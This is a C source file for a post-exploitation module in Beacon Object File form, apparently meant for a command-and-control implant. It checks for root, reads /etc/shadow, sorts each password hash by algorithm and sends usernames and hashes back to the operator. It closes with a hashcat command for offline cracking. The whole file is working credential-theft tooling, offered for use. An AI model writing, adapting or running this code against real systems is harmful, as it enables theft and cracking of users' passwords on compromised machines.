/// shadow_dump.c — Dump /etc/shadow hashes for offline cracking
/// gcc -c -o shadow_dump.o shadow_dump.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

static void hdr(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 %s\n", s); }
static void sub(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x9c\xe2\x94\x80 %s\n", s); }
static void fin(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s); }
static void ln(const char *s)  { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %s\n", s); }

void go(char *args, int args_len) {
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Requires root to read /etc/shadow\n"); return;
    }
    hdr("Shadow Dump");

    char *sh = (char*)0; int sl = AxReadFileToBuffer("/etc/shadow", &sh, 524288);
    if (sl <= 0 || !sh) { BeaconPrintf(CALLBACK_ERROR, "[!] Cannot read /etc/shadow\n"); return; }

    sub("Crackable Hashes");
    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-12s %-10s %s\n", "USER", "TYPE", "HASH");

    int crackable = 0;
    char *line = sh;
    while (line < sh + sl) {
        char *eol = line; while (eol < sh+sl && *eol != '\n') eol++;
        char *c1 = line; while (c1 < eol && *c1 != ':') c1++;
        if (c1 < eol) {
            char *hs = c1+1;
            char *c2 = hs; while (c2 < eol && *c2 != ':') c2++;
            int hl = (int)(c2-hs);
            if (hl > 2 && *hs != '!' && *hs != '*') {
                char u[64]; int ul=(int)(c1-line); if(ul>63)ul=63; AxMemcpy(u,line,ul); u[ul]='\0';
                char h[512]; if(hl>511)hl=511; AxMemcpy(h,hs,hl); h[hl]='\0';
                const char *t = "unknown";
                if(AxStrncmp(h,"$1$",3)==0) t="MD5";
                else if(AxStrncmp(h,"$5$",3)==0) t="SHA-256";
                else if(AxStrncmp(h,"$6$",3)==0) t="SHA-512";
                else if(AxStrncmp(h,"$y$",3)==0) t="yescrypt";
                else if(AxStrncmp(h,"$2b$",4)==0||AxStrncmp(h,"$2a$",4)==0) t="bcrypt";
                BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %-12s %-10s %s\n", u, t, h);
                crackable++;
            }
        }
        line = eol+1;
    }
    AxFree(sh);
    if (crackable == 0) ln("(no crackable hashes)");
    else {
        char s[64]; AxSnprintf(s, sizeof(s), "%d crackable hash(es)", crackable); ln(s);
        ln("Crack: hashcat -m 1800 hashes.txt wordlist.txt");
    }
    fin("Shadow dump complete");
}
